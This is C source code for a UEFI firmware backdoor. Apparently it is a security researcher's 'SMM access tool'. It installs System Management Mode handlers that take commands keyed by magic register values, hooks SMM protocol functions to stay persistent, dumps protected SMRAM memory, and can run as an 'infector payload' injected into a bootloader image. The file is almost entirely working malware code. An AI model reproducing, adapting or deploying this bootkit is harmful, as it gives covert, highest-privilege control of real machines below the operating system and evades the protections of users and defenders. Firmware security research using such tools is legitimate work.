EFI_STATUS EFIAPI PeriodicTimerDispatch2Handler(
    EFI_HANDLE DispatchHandle, CONST VOID *Context,
    VOID *CommBuffer, UINTN *CommBufferSize)
{
    EFI_STATUS Status = EFI_SUCCESS;   
    EFI_SMM_CPU_PROTOCOL *SmmCpu = NULL;    

    if (g_BackdoorInfo == NULL)
    {
        // we need this structure for communicating with the outsude world
        goto _end;
    }

    m_PeriodicTimerCounter += 1;
    g_BackdoorInfo->TicksCount = m_PeriodicTimerCounter;

    Status = m_Smst->SmmLocateProtocol(&gEfiSmmCpuProtocolGuid, NULL, (PVOID *)&SmmCpu);
    if (Status == EFI_SUCCESS)
    {
        CONTROL_REGS ControlRegs;
        UINT64 Rax = 0, Rcx = 0, Rdx = 0, Rdi = 0, Rsi = 0, R8 = 0, R9 = 0;        

        READ_SAVE_STATE(EFI_SMM_SAVE_STATE_REGISTER_CR0, ControlRegs.Cr0);
        READ_SAVE_STATE(EFI_SMM_SAVE_STATE_REGISTER_CR3, ControlRegs.Cr3);
        READ_SAVE_STATE(EFI_SMM_SAVE_STATE_REGISTER_RCX, Rcx); // user-mode instruction pointer
        READ_SAVE_STATE(EFI_SMM_SAVE_STATE_REGISTER_RDI, Rdi); // 1-st param (code)
        READ_SAVE_STATE(EFI_SMM_SAVE_STATE_REGISTER_RSI, Rsi); // 2-nd param (arg1)
        READ_SAVE_STATE(EFI_SMM_SAVE_STATE_REGISTER_RDX, Rdx); // 3-rd param (arg2)
        READ_SAVE_STATE(EFI_SMM_SAVE_STATE_REGISTER_R8, R8);
        READ_SAVE_STATE(EFI_SMM_SAVE_STATE_REGISTER_R9, R9);        

        /* 
            Check for magic values that was set in smm_call(),
            see smm_call/smm_call.asm for more info.
        */
        if (R8 == BACKDOOR_SMM_CALL_R8_VAL && R9 == BACKDOOR_SMM_CALL_R9_VAL)
        {            
            DbgMsg(
                __FILE__, __LINE__, 
                "smm_call(): CPU #%d, RDI = 0x%llx, RSI = 0x%llx, RDX = 0x%llx\r\n", 
                m_Smst->CurrentlyExecutingCpu, Rdi, Rsi, Rdx
            );

            // handle backdoor control request
            Status = SmmCallHandle(Rdi, Rsi, Rdx, &ControlRegs);

            // set smm_call() return value
            WRITE_SAVE_STATE(EFI_SMM_SAVE_STATE_REGISTER_RAX, Rax, Status);

            // let smm_call() to exit from infinite loop
            WRITE_SAVE_STATE(EFI_SMM_SAVE_STATE_REGISTER_RCX, Rcx, Rcx - MAX_JUMP_SIZE);
        }
    }
    else
    {
        DbgMsg(__FILE__, __LINE__, "LocateProtocol() fails: 0x%X\r\n", Status);   
    }

_end:

    return EFI_SUCCESS;
}

EFI_STATUS PeriodicTimerDispatch2Register(EFI_HANDLE *DispatchHandle)
{
    EFI_STATUS Status = EFI_INVALID_PARAMETER;  

    if (m_PeriodicTimerDispatch)
    {
        // register periodic timer routine
        Status = m_PeriodicTimerDispatch->Register(
            m_PeriodicTimerDispatch, 
            PeriodicTimerDispatch2Handler, 
            &m_PeriodicTimerDispatch2RegCtx,
            DispatchHandle
        );
        if (Status == EFI_SUCCESS)
        {
            DbgMsg(
                __FILE__, __LINE__, "SMM timer handler is at "FPTR"\r\n", 
                PeriodicTimerDispatch2Handler
            );
        }
        else
        {
            DbgMsg(__FILE__, __LINE__, "Register() fails: 0x%X\r\n", Status);
        }
    }    

    return Status;
}

EFI_STATUS PeriodicTimerDispatch2Unregister(EFI_HANDLE DispatchHandle)
{
    EFI_STATUS Status = EFI_INVALID_PARAMETER;  

    if (m_PeriodicTimerDispatch)
    {
        // register periodic timer routine
        Status = m_PeriodicTimerDispatch->UnRegister(
            m_PeriodicTimerDispatch, 
            DispatchHandle
        );
        if (Status == EFI_SUCCESS)
        {
            DbgMsg(__FILE__, __LINE__, "SMM timer handler unregistered\r\n");
        }
        else
        {
            DbgMsg(__FILE__, __LINE__, "Unregister() fails: 0x%X\r\n", Status);
        }
    }    

    return Status;
}

EFI_STATUS EFIAPI PeriodicTimerDispatch2ProtocolNotifyHandler(
    CONST EFI_GUID *Protocol, 
    VOID *Interface, 
    EFI_HANDLE Handle)
{
    EFI_STATUS Status = EFI_SUCCESS;   
    UINT64 *SmiTickInterval = NULL;

    m_PeriodicTimerDispatch = 
        (EFI_SMM_PERIODIC_TIMER_DISPATCH2_PROTOCOL *)Interface;   

#if defined(BACKDOOR_DEBUG)

    SerialPrint("Supported timer intervals:");

    do
    {
        Status = m_PeriodicTimerDispatch->GetNextShorterInterval(
            m_PeriodicTimerDispatch,
            &SmiTickInterval
        );
        if (Status == EFI_SUCCESS)
        {
            if (*SmiTickInterval < 0x80000000)
            {
                char szBuff[0x20];

                // build debug message string
                tfp_sprintf(szBuff, " %lld", *SmiTickInterval);
                SerialPrint(szBuff);
            }            
        }
        else
        {
            break;
        }
    }
    while (SmiTickInterval);

    SerialPrint("\r\n");

#endif // BACKDOOR_DEBUG         

    return EFI_SUCCESS;   
}
//--------------------------------------------------------------------------------------
EFI_STATUS EFIAPI SwDispatch2Handler(
    EFI_HANDLE DispatchHandle, CONST VOID *Context,
    VOID *CommBuffer, UINTN *CommBufferSize)
{
    EFI_SMM_SW_CONTEXT *SwContext = (EFI_SMM_SW_CONTEXT *)CommBuffer;
    EFI_SMM_CPU_PROTOCOL *SmmCpu = NULL;
    EFI_STATUS Status = EFI_SUCCESS;

    DbgMsg(
        __FILE__, __LINE__, 
        __FUNCTION__"(): command port = 0x%X, data port = 0x%X\r\n",
        SwContext->CommandPort, SwContext->DataPort
    );

    if (g_BackdoorInfo == NULL)
    {
        // we need this structure for communicating with the outsude world
        goto _end;
    }

    Status = m_Smst->SmmLocateProtocol(&gEfiSmmCpuProtocolGuid, NULL, (PVOID *)&SmmCpu);
    if (Status == EFI_SUCCESS)
    {
        UINT64 Code = (UINT64)SwContext->DataPort;
        CONTROL_REGS ControlRegs;
        UINT64 Rcx = 0;         

        ControlRegs.Cr0 = ControlRegs.Cr3 = ControlRegs.Cr4 = 0;

        Status = SmmCpu->ReadSaveState(
            SmmCpu, sizeof(ControlRegs.Cr0), EFI_SMM_SAVE_STATE_REGISTER_CR0, 
            SwContext->SwSmiCpuIndex, (PVOID)&ControlRegs.Cr0
        );
        if (EFI_ERROR(Status))
        {
            DbgMsg(__FILE__, __LINE__, "ReadSaveState() fails: 0x%X\r\n", Status);
            goto _end;
        }

        Status = SmmCpu->ReadSaveState(
            SmmCpu, sizeof(ControlRegs.Cr3), EFI_SMM_SAVE_STATE_REGISTER_CR3, 
            SwContext->SwSmiCpuIndex, (PVOID)&ControlRegs.Cr3
        );
        if (EFI_ERROR(Status))
        {
            DbgMsg(__FILE__, __LINE__, "ReadSaveState() fails: 0x%X\r\n", Status);
            goto _end;
        }

        Status = SmmCpu->ReadSaveState(
            SmmCpu, sizeof(Rcx), EFI_SMM_SAVE_STATE_REGISTER_RCX, 
            SwContext->SwSmiCpuIndex, (PVOID)&Rcx
        );
        if (EFI_ERROR(Status))
        {
            DbgMsg(__FILE__, __LINE__, "ReadSaveState() fails: 0x%X\r\n", Status);
            goto _end;
        }

        DbgMsg(
            __FILE__, __LINE__, __FUNCTION__"(): CPU #%d, Code = %llx, RCX = 0x%llx\r\n",
            SwContext->SwSmiCpuIndex, Code, Rcx
        );

        // handle backdoor control request
        SmmCallHandle(Code, Rcx, 0, &ControlRegs);
    }
    else
    {
        DbgMsg(__FILE__, __LINE__, "LocateProtocol() fails: 0x%X\r\n", Status);   
    }

_end:

    return EFI_SUCCESS;
}

#ifdef USE_SW_DISPATCH_REGISTER_HOOK

EFI_SMM_SW_REGISTER2 old_SwDispatch2Register = NULL;

EFI_STATUS EFIAPI new_SwDispatch2Register(
    CONST EFI_SMM_SW_DISPATCH2_PROTOCOL *This,
    EFI_SMM_HANDLER_ENTRY_POINT2 DispatchFunction,
    EFI_SMM_SW_REGISTER_CONTEXT *RegisterContext,
    EFI_HANDLE *DispatchHandle)
{
    // call original function
    EFI_STATUS Status = old_SwDispatch2Register(
        This,
        DispatchFunction,
        RegisterContext,
        DispatchHandle
    );
    if (Status == EFI_SUCCESS && RegisterContext)
    {
        DbgMsg(
            __FILE__, __LINE__, __FUNCTION__"(): val = 0x%.2x, handler = "FPTR"\r\n",
            RegisterContext->SwSmiInputValue, DispatchFunction
        );
    }

    return Status;
}

#endif // USE_SW_DISPATCH_REGISTER_HOOK

EFI_STATUS EFIAPI SwDispatch2ProtocolNotifyHandler(
    CONST EFI_GUID *Protocol, 
    VOID *Interface, 
    EFI_HANDLE Handle)
{
    EFI_STATUS Status = EFI_SUCCESS;
    EFI_HANDLE DispatchHandle = NULL;

    EFI_SMM_SW_DISPATCH2_PROTOCOL *SwDispatch = 
        (EFI_SMM_SW_DISPATCH2_PROTOCOL *)Interface;    

    DbgMsg(__FILE__, __LINE__, "Max. SW SMI value is 0x%X\r\n", SwDispatch->MaximumSwiValue);

    // register software SMI handler
    Status = SwDispatch->Register(
        SwDispatch, 
        SwDispatch2Handler, 
        &m_SwDispatch2RegCtx,
        &DispatchHandle
    );
    if (Status == EFI_SUCCESS)
    {
        DbgMsg(__FILE__, __LINE__, "SW SMI handler is at "FPTR"\r\n", SwDispatch2Handler);
    }
    else
    {
        DbgMsg(__FILE__, __LINE__, "Register() fails: 0x%X\r\n", Status);
    }

#ifdef USE_SW_DISPATCH_REGISTER_HOOK

    DbgMsg(
        __FILE__, __LINE__, "Hooking Register(): "FPTR" -> "FPTR"\r\n",
        SwDispatch->Register, new_SwDispatch2Register
    );

    // set up EFI_SMM_SW_DISPATCH2_PROTOCOL.Register() hook
    old_SwDispatch2Register = SwDispatch->Register;
    SwDispatch->Register = new_SwDispatch2Register;

#endif

    return EFI_SUCCESS;   
}
//--------------------------------------------------------------------------------------
EFI_STATUS EFIAPI EndOfDxeProtocolNotifyHandler(
    CONST EFI_GUID *Protocol, 
    VOID *Interface, 
    EFI_HANDLE Handle)
{        
    DbgMsg(__FILE__, __LINE__, "End of DXE phase\n");

    if (g_BackdoorInfo)
    {        

#ifdef USE_SMRAM_AUTO_DUMP

        UINTN Offset = 0, p = 0, i = 0;
        PUCHAR Buff = (PUCHAR)RVATOVA(g_BackdoorInfo, PAGE_SIZE); 

        gBS->SetMem(Buff, MAX_SMRAM_SIZE, 0);

        // enumerate available SMRAM regions
        for (;;)
        {
            EFI_SMRAM_DESCRIPTOR *Info = &g_BackdoorInfo->SmramMap[i];

            if (Info->PhysicalStart == 0 || Info->PhysicalSize == 0)
            {
                // end of the list
                break;
            }

            if (Offset + Info->PhysicalSize <= MAX_SMRAM_SIZE)
            {
                // enumerate memory pages for each region
                for (p = 0; p < Info->PhysicalSize; p += PAGE_SIZE)
                {
                    UINT64 Addr = Info->PhysicalStart + p;

                    // check for valid virtual address
                    if (VirtualAddrValid(Addr, __readcr3()))
                    {
                        // copy SMRAM region into the backdoor info structure
                        gBS->CopyMem(Buff + Offset, (VOID *)Addr, PAGE_SIZE);
                    }

                    Offset += PAGE_SIZE;
                }                
            }
            else
            {
                break;
            }

            i += 1;
        }

        g_BackdoorInfo->BackdoorStatus = BACKDOOR_INFO_FULL;

#else // USE_SMRAM_AUTO_DUMP

        g_BackdoorInfo->BackdoorStatus = EFI_INVALID_PARAMETER;

#endif // USE_SMRAM_AUTO_DUMP

#ifdef USE_MSR_SMM_MCA_CAP

        // read MSR_SMM_MCA_CAP and MSR_SMM_FEATURE_CONTROL registers
        g_BackdoorInfo->SmmMcaCap = __readmsr(MSR_SMM_MCA_CAP);
        g_BackdoorInfo->SmmFeatureControl = __readmsr(MSR_SMM_FEATURE_CONTROL);

#endif
        
    }    

    return EFI_SUCCESS;   
}
//--------------------------------------------------------------------------------------
#ifdef USE_PERIODIC_TIMER

#define AMI_USB_SMM_PROTOCOL_GUID { 0x3ef7500e, 0xcf55, 0x474f, \
                                    { 0x8e, 0x7e, 0x00, 0x9e, 0x0e, 0xac, 0xec, 0xd2 }}

EFI_LOCATE_PROTOCOL old_SmmLocateProtocol = NULL;

EFI_STATUS EFIAPI new_SmmLocateProtocol(
    EFI_GUID *Protocol,
    VOID *Registration,
    VOID **Interface)
{        
    EFI_GUID TargetGuid = AMI_USB_SMM_PROTOCOL_GUID;

    /*
        Totally board-specific hack for Intel DQ77KB, SmmLocateProtocol
        with AMI_USB_SMM_PROTOCOL_GUID is calling during OS startup after
        APIC init, so, here we can register our SMI timer.
    */
    if (Protocol && !memcmp(Protocol, &TargetGuid, sizeof(TargetGuid)))
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"()\r\n");

        if (m_PeriodicTimerDispatchHandle)
        {
            // unregister previously registered timer
            PeriodicTimerDispatch2Unregister(m_PeriodicTimerDispatchHandle);
            m_PeriodicTimerDispatchHandle = NULL;
        }

        // enable periodic timer SMI again
        PeriodicTimerDispatch2Register(&m_PeriodicTimerDispatchHandle); 

        // remove the hook
        m_Smst->SmmLocateProtocol = old_SmmLocateProtocol;           
    }    

    return old_SmmLocateProtocol(Protocol, Registration, Interface);
}

#endif // USE_PERIODIC_TIMER

EFI_STATUS RegisterProtocolNotifySmm(EFI_GUID *Guid, EFI_SMM_NOTIFY_FN Handler, PVOID *Registration)
{
    EFI_STATUS Status = m_Smst->SmmRegisterProtocolNotify(Guid, Handler, Registration);
    if (Status == EFI_SUCCESS)
    {
        DbgMsg(__FILE__, __LINE__, "SMM protocol notify handler is at "FPTR"\r\n", Handler);
    }
    else
    {
        DbgMsg(__FILE__, __LINE__, "RegisterProtocolNotify() fails: 0x%X\r\n", Status);
    }

    return Status;
}

VOID BackdoorEntrySmm(VOID)
{
    PVOID Registration = NULL;
    EFI_STATUS Status = EFI_SUCCESS;
    EFI_SMM_PERIODIC_TIMER_DISPATCH2_PROTOCOL *PeriodicTimerDispatch = NULL;
    EFI_SMM_SW_DISPATCH2_PROTOCOL *SwDispatch = NULL;    

    DbgMsg(__FILE__, __LINE__, "Running in SMM\r\n");
    DbgMsg(__FILE__, __LINE__, "SMM system table is at "FPTR"\r\n", m_Smst);

    #define REGISTER_NOTIFY(_name_)                                 \
                                                                    \
        RegisterProtocolNotifySmm(&gEfiSmm##_name_##ProtocolGuid,   \
            _name_##ProtocolNotifyHandler, &Registration)

    Status = m_Smst->SmmLocateProtocol(
        &gEfiSmmPeriodicTimerDispatch2ProtocolGuid, NULL, 
        &PeriodicTimerDispatch
    );
    if (Status == EFI_SUCCESS)
    {
        // protocol is already present, call handler directly
        PeriodicTimerDispatch2ProtocolNotifyHandler(
            &gEfiSmmPeriodicTimerDispatch2ProtocolGuid,
            PeriodicTimerDispatch, NULL
        );
    }
    else
    {
        // set registration notifications for required SMM protocol
        REGISTER_NOTIFY(PeriodicTimerDispatch2);    
    }

    Status = m_Smst->SmmLocateProtocol(
        &gEfiSmmSwDispatch2ProtocolGuid, NULL, 
        &SwDispatch
    );
    if (Status == EFI_SUCCESS)
    {
        // protocol is already present, call handler directly
        SwDispatch2ProtocolNotifyHandler(
            &gEfiSmmSwDispatch2ProtocolGuid,
            SwDispatch, NULL
        );
    }
    else
    {
        // set registration notifications for required SMM protocol
        REGISTER_NOTIFY(SwDispatch2);    
    }

    REGISTER_NOTIFY(EndOfDxe);

#ifdef USE_PERIODIC_TIMER

    DbgMsg(
        __FILE__, __LINE__, "Hooking SmmLocateProtocol(): "FPTR" -> "FPTR"\r\n",
        m_Smst->SmmLocateProtocol, new_SmmLocateProtocol
    );

    // hook SmmLocateProtocol() SMST function to get execution during OS boot phase
    old_SmmLocateProtocol = m_Smst->SmmLocateProtocol;
    m_Smst->SmmLocateProtocol = new_SmmLocateProtocol;

#endif // USE_PERIODIC_TIMER

}
//--------------------------------------------------------------------------------------
EFI_STATUS BackdoorEntryInfected(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable)
{
    PVOID Base = BackdoorImageAddress();

    // setup correct image relocations
    LdrProcessRelocs(Base, Base);

    m_ImageBase = Base;

    // call real entry point
    return BackdoorEntry(
        ImageHandle,
        SystemTable
    );
}
//--------------------------------------------------------------------------------------
EFI_STATUS BackdoorEntryExploit(EFI_SMM_SYSTEM_TABLE2 *Smst)
{
    m_Smst = Smst;

    // run SMM code
    BackdoorEntrySmm();

    return EFI_SUCCESS;
}
//--------------------------------------------------------------------------------------
EFI_STATUS BackdoorEntry(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable) 
{
    EFI_STATUS Ret = EFI_SUCCESS, Status = EFI_SUCCESS;
    PVOID Image = NULL;            

    EFI_LOADED_IMAGE *LoadedImage = NULL;   
    EFI_SMM_BASE2_PROTOCOL *SmmBase = NULL;    
    EFI_SMM_ACCESS2_PROTOCOL *SmmAccess = NULL; 

    if (m_ImageHandle == NULL)
    {
        m_ImageHandle = ImageHandle;    

        gST = SystemTable;
        gBS = gST->BootServices;
        gRT = gST->RuntimeServices;        

        // allocate temp buffer for debug output
        ConsoleInit();

        // initialize serial port I/O for debug messages
        SerialInit();        

        DbgMsg(__FILE__, __LINE__, "***********************************************\r\n");
        DbgMsg(__FILE__, __LINE__, "                                               \r\n");
        DbgMsg(__FILE__, __LINE__, "  UEFI SMM access tool                         \r\n");
        DbgMsg(__FILE__, __LINE__, "                                               \r\n");
        DbgMsg(__FILE__, __LINE__, "  by Dmytro Oleksiuk (aka Cr4sh)               \r\n");
        DbgMsg(__FILE__, __LINE__, "  cr4sh0@gmail.com                             \r\n");
        DbgMsg(__FILE__, __LINE__, "                                               \r\n");
        DbgMsg(__FILE__, __LINE__, "***********************************************\r\n");
        DbgMsg(__FILE__, __LINE__, "                                               \r\n");

        // allocate temp buffer for backdoor info        
        BackdoorInfoInit();   

        m_bInfectedImage = FALSE;

        if (ImageHandle != NULL)
        {
            // get current image information
            gBS->HandleProtocol(ImageHandle, &gEfiLoadedImageProtocolGuid, (VOID *)&LoadedImage);    
            
            if (m_ImageBase == NULL)
            {
                // bootkit was loaded as EFI application or driver                
                m_ImageBase = LoadedImage->ImageBase;

                DbgMsg(__FILE__, __LINE__, "Started as standalone driver/app\r\n");
            }
            else
            {
                // bootkit was loaded as infector payload
                m_bInfectedImage = TRUE;

                DbgMsg(__FILE__, __LINE__, "Started as infector payload\r\n");
            }

            DbgMsg(__FILE__, __LINE__, "Image base address is "FPTR"\r\n", m_ImageBase);    

            // copy image to the new location in EFI runtime memory
            if ((Image = BackdoorImageReallocate(m_ImageBase)) != NULL)
            {
                BACKDOOR_ENTRY_RESIDENT pEntry = (BACKDOOR_ENTRY_RESIDENT)BACKDOOR_RELOCATED_ADDR(
                    BackdoorEntryResident, 
                    Image
                );

                DbgMsg(__FILE__, __LINE__, "Resident code base address is "FPTR"\r\n", Image);
                
                // initialize resident code of the bootkit
                pEntry(Image);
            } 
        }
    }     

    if ((g_BackdoorInfo = BackdoorInfoGet()) != NULL)
    {
        DbgMsg(
            __FILE__, __LINE__, "Previous calls count is %d\r\n", 
            g_BackdoorInfo->CallsCount
        );

        g_BackdoorInfo->CallsCount += 1;
    }

    Status = gBS->LocateProtocol(&gEfiSmmBase2ProtocolGuid, NULL, (PVOID *)&SmmBase);
    if (Status == EFI_SUCCESS)
    {
        BOOLEAN bInSmram = FALSE;

        if (g_BackdoorInfo)
        {
            Status = gBS->LocateProtocol(&gEfiSmmAccess2ProtocolGuid, NULL, (PVOID *)&SmmAccess);
            if (Status == EFI_SUCCESS)
            {
                UINTN SmramMapSize = PAGE_SIZE - sizeof(BACKDOOR_INFO);

                // get SMRAM information
                Status = SmmAccess->GetCapabilities(
                    SmmAccess,
                    &SmramMapSize,
                    g_BackdoorInfo->SmramMap
                );
                if (Status != EFI_SUCCESS)
                {
                    DbgMsg(__FILE__, __LINE__, "GetCapabilities() fails: 0x%X\r\n", Status);
                }
            }
        }

        // check if running in SMM
        SmmBase->InSmm(SmmBase, &bInSmram);

        if (bInSmram)
        {
            Status = SmmBase->GetSmstLocation(SmmBase, &m_Smst);
            if (Status == EFI_SUCCESS)
            {                
                // run SMM code
                BackdoorEntrySmm();
            }   
            else
            {
                DbgMsg(__FILE__, __LINE__, "GetSmstLocation() fails: 0x%X\r\n", Status);
            }
        }                
    }

    if (m_bInfectedImage)
    {
        // call original bootloader image entry point
        Ret = BackdoorImageCallRealEntry(LoadedImage->ImageBase, ImageHandle, SystemTable);
    }    

    return Ret;
}
//--------------------------------------------------------------------------------------
// EoF
